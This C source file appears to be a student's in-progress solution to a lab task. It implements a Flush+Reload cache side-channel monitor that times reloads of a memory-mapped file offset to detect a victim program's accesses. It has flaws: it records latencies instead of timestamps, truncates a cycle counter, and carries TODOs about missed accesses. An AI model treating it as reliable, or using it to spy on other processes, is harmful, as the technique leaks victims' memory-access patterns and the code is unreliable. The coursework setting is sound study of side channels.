#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
/*
Write a program  monitor <filename> <offset> <period>, which uses the monitor function from Task 3 to 
monitor the specified offset in the file every period cycles. The program continues monitoring until 
it detects 2000 accesses or when it fails to detect accesses for 10,000,000,000 cycles (about 3-4 
seconds). On exit, the program prints the times (cycle counts from rdtsc) at which it detected 
addresses - one time per line. Note that printing takes a long time, so you want to store the results 
in memory and print them after monitoring completes.

We provide a test program at /home/victim/frtest.  The test program accepts a file name and an offset, 
and performs 1000 accesses to the specified location. The program prints the times at which it 
performed the access. Use frtest to measure monitor accuracy for monitoring periods of 1000, 2000, 
..., 20000 cycles.
*/

void *map(char *file_name, uint64_t offset)
{
    int file_descriptor = open(file_name, O_RDONLY); 
    if (file_descriptor == -1) return NULL;
    struct stat st_buf;
    if (fstat(file_descriptor, &st_buf) == -1) return NULL;
    size_t map_len = st_buf.st_size - offset;
	void *mapping = mmap(NULL, map_len, PROT_READ, MAP_PRIVATE, file_descriptor, offset);
	if (mapping == MAP_FAILED){
		printf("mmap fail with errno %d\n", errno); // fix problems with mmap
		return NULL;
	}
	close(file_descriptor);
	return mapping;  // mapping will be implicitly unmapped when calling function will be exited
}

static __inline__ uint64_t rdtsc(void)
{
    uint32_t lo, hi;
    __asm__ volatile ("rdtscp" : "=a" (lo), "=d" (hi) : : "ecx");
    return ((uint64_t)hi<<32)|lo;
}

uint32_t flush_reload(void *p)
{
	volatile unsigned long time;    
    __asm__ volatile (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " mov r8, rax 		\n"
        " mov rax, [%1]		\n"
        " lfence            \n"
        " rdtsc             \n"
        " sub rax, r8 		\n"
        " clflush [%1] 		\n"
        : "=&a" (time)
        : "r" (p)
        : "rdx", "r8");
    return time;
}

int monitor_modified(void *p, uint32_t period, uint64_t maxwait, int index, uint64_t *timestamps)
{
	uint64_t start, global_start = rdtsc();
	while (rdtsc() - global_start < maxwait)
	{	
		start = rdtsc();
		timestamps[index] = flush_reload(p);
		if (flush_reload(p) < 100) return 1;
		while(rdtsc() - start < period);
	}
	return timestamps[index] = 0; // reset timestamp value (nothing found) and return 0
}

# define CYCLE_LIMIT 10000000000

int main(int ac, char **av){
	
	// input validation
	if (ac != 4) return 1;
	char *filename = av[1];
	printf("filename %s\n", filename);
	uint64_t offset = atoi(av[2]);
	printf("offset %li\n", offset);
	uint64_t period = atoi(av[3]);
	printf("period %li\n", period);
	uint64_t timestamps[2000] = {0};
	
	void *location = map(filename, offset);
	int counter = 0;
	
	uint32_t start = rdtsc();
	while(rdtsc()-start < 1000000000);
	start = rdtsc();
	while((rdtsc() - start) < CYCLE_LIMIT){
		counter+=monitor_modified(location, period, 100000000, counter, timestamps);
		if (counter>1999)
		{
			break;
			// success
		}
	}
	
	printf("detections counter %i\n", counter);
	printf("the monitored timestamps are\n");
	for (counter=0;counter<2000;counter++) printf("%lu\n", timestamps[counter]);
	
	// debug
	
	
	return 0; // finish programm, unmap mapping
}


// TODO loosing accesses

// TODO change monitor function for more precise measurements